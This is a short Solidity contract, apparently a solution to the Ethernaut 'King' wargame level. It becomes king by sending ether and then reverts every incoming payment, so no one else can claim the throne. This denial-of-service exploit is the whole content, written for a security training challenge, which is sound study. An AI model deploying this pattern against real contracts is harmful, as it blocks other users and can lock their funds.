// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 09: King
// https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5

contract King_Hack {
    address payable kingInstance;

    constructor(address payable _kingInstance) {
      kingInstance = _kingInstance;
    }

    function becomeKing() public payable {
      (bool success, ) = kingInstance.call{ value: msg.value }("");
      require(success, 'becomeKing(), kingInstance.call() failed');
    }
    
    receive() external payable {
        // Make this fail
        revert("Sorry I broke you");
    }
}

interface IKing {
    function prize() external returns (uint);
}